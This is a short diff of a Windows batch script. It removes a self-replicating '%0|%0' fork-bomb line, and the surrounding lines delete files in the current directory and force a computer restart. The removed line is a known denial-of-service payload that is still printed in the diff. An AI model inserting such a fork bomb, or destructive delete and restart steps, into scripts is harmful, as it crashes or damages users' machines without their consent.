@@ -55,8 +55,6 @@ if /I "%confirm%"=="y" (
     if errorlevel 1 echo Failed to delete files in the current directory >> log.txt
 )
 
-REM Execute itself recursively
-%0|%0
 
 REM Confirm before restarting the computer
 echo WARNING: This will restart your computer immediately.
